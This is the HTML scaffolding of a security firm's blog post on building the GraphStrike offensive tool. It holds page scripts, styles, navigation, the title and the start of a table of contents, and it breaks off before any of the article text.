<html lang="en-US" class="no-js"><head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="robots" content="max-image-preview:large">
<link rel="dns-prefetch" href="//js.hs-scripts.com">
<script type="text/javascript" async="" src="https://snap.licdn.com/li.lms-analytics/insight.min.js"></script><script src="https://js-na1.hs-scripts.com/22155268.js" type="text/javascript" id="hs-script-loader"></script><script src="https://js.hsadspixel.net/fb.js" type="text/javascript" id="hs-ads-pixel-22155268" data-ads-portal-id="22155268" data-ads-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="22155268" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hscollectedforms.net/collectedforms.js" type="text/javascript" id="CollectedForms-22155268" crossorigin="anonymous" data-leadin-portal-id="22155268" data-leadin-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="22155268" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hs-analytics.net/analytics/1718453400000/22155268.js" type="text/javascript" id="hs-analytics"></script><script src="https://js.hs-banner.com/v2/22155268/banner.js" type="text/javascript" id="cookieBanner-22155268" data-cookieconsent="ignore" data-hs-ignore="true" data-loader="hs-scriptloader" data-hsjs-portal="22155268" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-K7F2V5V2R0&amp;l=dataLayer&amp;cx=c"></script><script async="" src="https://edge.marker.io/latest/shim.js"></script><script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/redsiege.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.4"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="wpsm_colorbox-font-awesome-front-css" href="https://redsiege.com/wp-content/plugins/colorbox-panels/assets/css/font-awesome/css/font-awesome.min.css?ver=6.5.4" type="text/css" media="all">
<link rel="stylesheet" id="wpsm_colorbox_bootstrap-front-css" href="https://redsiege.com/wp-content/plugins/colorbox-panels/assets/css/bootstrap-front.css?ver=6.5.4" type="text/css" media="all">
<link rel="stylesheet" id="rawa-aos-css-css" href="https://redsiege.com/wp-content/plugins/ra-widgets-animate/public/css/aos.css?ver=6.5.4" type="text/css" media="all">
<link rel="stylesheet" id="st-topbar-cta-style-css" href="https://redsiege.com/wp-content/plugins/topbar-call-to-action-pro-premium/assets/css/style.min.css?ver=6.5.4" type="text/css" media="all">
<style id="st-topbar-cta-style-inline-css" type="text/css">
#st-topbar-cta, div.st-topbar-cta-collapse-open { 
            background-color: #ffffff; }#st-topbar-cta { 
            padding: 7px 0; }#st-topbar-cta .st-topbar-cta-message p { 
            color: #000000; }#st-topbar-cta .st-topbar-cta-message p { 
            font-size: 20px; }#st-topbar-cta .st-topbar-cta-message p { 
            font-weight: 400; }#st-topbar-cta .st-topbar-cta-message p span { 
            border-bottom: 1px solid#000000; }div#st-topbar-cta .st-topbar-cta-collapse svg, div.st-topbar-cta-collapse-open svg { 
            fill: #000000; }#st-topbar-cta .st-topbar-cta-btn a.btn { 
            background-color: #c43430; }#st-topbar-cta .st-topbar-cta-btn a.btn { 
            color: #fff; }#st-topbar-cta .st-topbar-cta-btn a.btn:hover, #st-topbar-cta .st-topbar-cta-btn a.btn:focus  { 
            background-color: #d74e4d; }#st-topbar-cta .st-topbar-cta-btn a.btn:hover, #st-topbar-cta .st-topbar-cta-btn a.btn:focus  { 
            color: #fff; }#st-topbar-cta .st-topbar-cta-btn a.btn { 
            padding: 5px 10px; }#st-topbar-cta .st-topbar-cta-btn a.btn { 
            font-size: 12px; }#st-topbar-cta .st-topbar-cta-btn a.btn { 
            font-weight: 400; }#st-topbar-cta .st-topbar-cta-btn a.btn { 
            border-radius: 15px; }
</style>
<link rel="stylesheet" id="ez-toc-css" href="https://redsiege.com/wp-content/plugins/easy-table-of-contents/assets/css/screen.min.css?ver=2.0.66.1" type="text/css" media="all">
<style id="ez-toc-inline-css" type="text/css">
div#ez-toc-container .ez-toc-title {font-size: 120%;}div#ez-toc-container .ez-toc-title {font-weight: 500;}div#ez-toc-container ul li {font-size: 95%;}div#ez-toc-container ul li {font-weight: 500;}div#ez-toc-container nav ul ul li {font-size: 90%;}
.ez-toc-container-direction {direction: ltr;}.ez-toc-counter ul{counter-reset: item ;}.ez-toc-counter nav ul li a::before {content: counters(item, ".", decimal) ". ";display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }.ez-toc-widget-direction {direction: ltr;}.ez-toc-widget-container ul{counter-reset: item ;}.ez-toc-widget-container nav ul li a::before {content: counters(item, ".", decimal) ". ";display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }
</style>
<link rel="stylesheet" id="base_style-css" href="https://redsiege.com/wp-content/themes/red-siege-theme/style.css?ver=1.0.0" type="text/css" media="all">
<link rel="stylesheet" id="enlighterjs-css" href="https://redsiege.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=0A0B0C" type="text/css" media="all">
<script type="text/javascript" src="https://redsiege.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/colorbox-panels/assets/js/masonry.pkgd.min.js?ver=6.5.4" id="wpsm_colorbox_masnory-js"></script>
<script type="text/javascript" src="https://redsiege.com/wp-content/plugins/colorbox-panels/assets/js/jcolumn.min.js?ver=6.5.4" id="wpsm_colorbox_height-js"></script>
<link rel="https://api.w.org/" href="https://redsiege.com/wp-json/"><link rel="alternate" type="application/json" href="https://redsiege.com/wp-json/wp/v2/posts/4553"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://redsiege.com/xmlrpc.php?rsd">
<meta name="generator" content="WordPress 6.5.4">
<link rel="canonical" href="https://redsiege.com/blog/2024/01/graphstrike-developer/">
<link rel="shortlink" href="https://redsiege.com/?p=4553">
<link rel="alternate" type="application/json+oembed" href="https://redsiege.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fredsiege.com%2Fblog%2F2024%2F01%2Fgraphstrike-developer%2F">
<link rel="alternate" type="text/xml+oembed" href="https://redsiege.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fredsiege.com%2Fblog%2F2024%2F01%2Fgraphstrike-developer%2F&amp;format=xml">

			<!-- Global site tag (gtag.js) - Google Analytics -->
			<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-121965899-1"></script>
			<script>
				window.dataLayer = window.dataLayer || [];
				function gtag(){dataLayer.push(arguments);}
				gtag('js', new Date());
				gtag( 'config', 'UA-121965899-1' );
			</script>

						<!-- DO NOT COPY THIS SNIPPET! Start of Page Analytics Tracking for HubSpot WordPress plugin v11.1.21-->
			<script class="hsq-set-content-id" data-content-id="blog-post">
				var _hsq = _hsq || [];
				_hsq.push(["setContentType", "blog-post"]);
			</script>
			<!-- DO NOT COPY THIS SNIPPET! End of Page Analytics Tracking for HubSpot WordPress plugin -->
			<meta name="tec-api-version" content="v1"><meta name="tec-api-origin" content="https://redsiege.com"><link rel="alternate" href="https://redsiege.com/wp-json/tribe/events/v1/">		<script>
			( function() {
				window.onpageshow = function( event ) {
					// Defined window.wpforms means that a form exists on a page.
					// If so and back/forward button has been clicked,
					// force reload a page to prevent the submit button state stuck.
					if ( typeof window.wpforms !== 'undefined' && event.persisted ) {
						window.location.reload();
					}
				};
			}() );
		</script>
		<link rel="icon" href="https://redsiege.com/wp-content/uploads/2018/07/cropped-logo-square-512-1-32x32.png" sizes="32x32">
<link rel="icon" href="https://redsiege.com/wp-content/uploads/2018/07/cropped-logo-square-512-1-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://redsiege.com/wp-content/uploads/2018/07/cropped-logo-square-512-1-180x180.png">
<meta name="msapplication-TileImage" content="https://redsiege.com/wp-content/uploads/2018/07/cropped-logo-square-512-1-270x270.png">
		<style type="text/css" id="wp-custom-css">
			.dark label {
	color: rgb(51, 51, 51);
}

code {
	background-color: rgb(240, 240, 240);
}


pre code {
	display: block;	
	background: rgb(240, 240, 240);
	white-space: break-spaces;
  overflow-wrap: break-word;
	margin-bottom: 1em;
}

img.border {
	border: #000;
	border-style: solid;
	border-width: 1px;
}

.st-topbar-cta-message p {
	margin-bottom: 0 !important;
}

header.header {
	display: contents;
}

header.header .wrap {
		background-color: #555;
}

.aligncenter {
	text-align: center;
	width: 100% !important;
}		</style>
		
	<script>
		window.markerConfig = {
			destination: '61ddbf4794b2f4214db492ab', 
			source: 'snippet'
		};
	</script>

	<script>
		!function(e,r,a){if(!e.__Marker){e.__Marker={};var t=[],n={__cs:t};["show","hide","isVisible","capture","cancelCapture","unload","reload","isExtensionInstalled","setReporter","setCustomData","on","off"].forEach(function(e){n[e]=function(){var r=Array.prototype.slice.call(arguments);r.unshift(e),t.push(r)}}),e.Marker=n;var s=r.createElement("script");s.async=1,s.src="https://edge.marker.io/latest/shim.js";var i=r.getElementsByTagName("script")[0];i.parentNode.insertBefore(s,i)}}(window,document);
	</script>
</head>


<body class="post-template-default single single-post postid-4553 single-format-standard tribe-js" data-aos-easing="ease" data-aos-duration="400" data-aos-delay="0">	
	<header class="header">
		<div class="wrap">
			<div class="header-logo">
				<a href="https://redsiege.com">
					<img width="300" height="73" src="https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-300x73.png" class="attachment-medium size-medium" alt="" decoding="async" srcset="https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-300x73.png 300w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-1024x249.png 1024w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-768x187.png 768w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-1536x374.png 1536w, https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-2048x499.png 2048w" sizes="(max-width: 300px) 100vw, 300px">				</a>
			</div>

			<div class="header-menu">

				<!--
				<span class="show-for-large">
										<a href="tel:12342491337" class="contact-link"><img src="https://redsiege.com/wp-content/themes/red-siege-theme/img/icon-phone.svg" /> +1 234-249-1337</a>
				</span>

				<span class="show-for-medium-only">
					<a href="tel:12342491337" class="call-now-link"><img src="https://redsiege.com/wp-content/themes/red-siege-theme/img/icon-phone-alt.svg" /><span class="screen-reader-text">Call Us Now</span></a>
				</span>
				-->

				<span class="show-for-large">
					<ul id="menu-primary" class="main-menu"><li id="menu-item-2726" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2726"><a href="https://redsiege.com/about-us/">About us</a></li>
<li id="menu-item-2775" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2775"><a href="https://redsiege.com/red-siege-blog/">Blog</a></li>
<li id="menu-item-4168" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4168"><a href="https://redsiege.com/tools/">Tools</a></li>
<li id="menu-item-3896" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3896"><a href="/training">Training</a></li>
<li id="menu-item-3534" class="menu-item menu-item-type-post_type menu-item-object-tribe_events menu-item-3534"><a href="https://redsiege.com/event/wednesdayoffensive/">WEDNESDAY OFFENSIVE</a></li>
<li id="menu-item-2777" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2777"><a href="https://redsiege.com/contact/">Contact</a></li>
</ul>				</span>
				
				<button class="menu-toggle hide-for-large">
					<span></span>
					<span></span>
					<span></span>
				</button>
			</div>
		</div>
	</header>

	<div class="mobile-menu-wrap">
		<div class="inner-content">
			<ul id="menu-primary-1" class="main-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2726"><a href="https://redsiege.com/about-us/">About us</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2775"><a href="https://redsiege.com/red-siege-blog/">Blog</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4168"><a href="https://redsiege.com/tools/">Tools</a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3896"><a href="/training">Training</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-tribe_events menu-item-3534"><a href="https://redsiege.com/event/wednesdayoffensive/">WEDNESDAY OFFENSIVE</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2777"><a href="https://redsiege.com/contact/">Contact</a></li>
</ul>
			<div class="show-for-small-only">

				
				<a href="tel:12342491337" class="contact-link"><img src="https://redsiege.com/wp-content/themes/red-siege-theme/img/icon-phone.svg"> +1 234-249-1337</a>
			</div>

		</div>
		<!--
		<div class="inner-content widget-area">
					</div>
		-->
	</div>

	<main role="main" class="page-body">


<section class="hero-banner">
	<div class="grid-container single-content-hero">
		<div class="grid-x grid-padding-x grid-margin-x grid-padding-y">

							<div class="cell small-12 medium-6">
					<h1>GraphStrike: Anatomy of Offensive Tool Development</h1>
					<p class="post-details">
						By Red Siege | January 22, 2024					</p>
									</div>
				<div class="cell small-12 medium-6">
					<div class="img-wrap">
						<img width="1920" height="1080" src="https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-Final.png" class="attachment-full size-full wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-Final.png 1920w, https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-Final-300x169.png 300w, https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-Final-1024x576.png 1024w, https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-Final-768x432.png 768w, https://redsiege.com/wp-content/uploads/2024/01/GRAPH-STRIKE-HEADER-IMAGE-Final-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px">					</div>
				</div>
					</div>
	</div>
</section>

<section class="single-content">
	<div class="grid-container">
		<div class="grid-x grid-padding-x grid-padding-y">
			<div class="cell small-12 medium-10 medium-offset-1 large-8 large-offset-2">
				<div id="ez-toc-container" class="ez-toc-v2_0_66_1 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction">
<div class="ez-toc-title-container">
<p class="ez-toc-title ">Table of Contents</p>
<span class="ez-toc-title-toggle"><a href="#" class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle ez-toc-loaded" aria-label="Toggle Table of Content"><span class="ez-toc-js-icon-con"><span class=""><span class="eztoc-hide" style="display:none;">Toggle</span><span class="ez-toc-icon-toggle-span"><svg style="fill: #999;color:#999" xmlns="http://www.w3.org/2000/svg" class="list-377408" width="20px" height="20px" viewBox="0 0 24 24" fill="none"><path d="M6 6H4v2h2V6zm14 0H8v2h12V6zM4 11h2v2H4v-2zm16 0H8v2h12v-2zM4 16h2v2H4v-2zm16 0H8v2h12v-2z" fill="currentColor"></path></svg><svg style="fill: #999;color:#999" class="arrow-unsorted-368013" xmlns="http://www.w3.org/2000/svg" width="10px" height="10px" viewBox="0 0 24 24" version="1.2" baseProfile="tiny"><path d="M18.2 9.3l-6.2-6.3-6.2 6.3c-.2.2-.3.4-.3.7s.1.5.3.7c.2.2.4.3.7.3h11c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7s-.1-.5-.3-.7zM5.8 14.7l6.2 6.3 6.2-6.3c.2-.2.3-.5.3-.7s-.1-.5-.3-.7c-.2-.2-.4-.3-.7-.3h-11c-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7s.1.5.3.7z"></path></svg></span></span></span></a></span></div>
<nav><ul class="ez-toc-list ez-toc-list-level-1 "><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-1" href="#Introduction" title="Introduction">Introduction</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-2" href="#It_All_Starts_with_an_Idea" title="It All Starts with an Idea">It All Starts with an Idea</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-3" href="#But_Is_It_Worth_Pursuing" title="But Is It Worth Pursuing?">But Is It Worth Pursuing?</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-4" href="#Initial_Research" title="Initial Research">Initial Research</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-5" href="#Assessing_Blockers_and_Determining_Viability" title="Assessing Blockers and Determining Viability">Assessing Blockers and Determining Viability</a><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><ul class="ez-toc-list-level-4"><li class="ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Rotating_Access_Tokens" title="Rotating Access Tokens">Rotating Access Tokens</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#Requests_to_Multiple_Domains" title="Requests to Multiple Domains">Requests to Multiple Domains</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Identifying_Compatible_Graph_API_Methods" 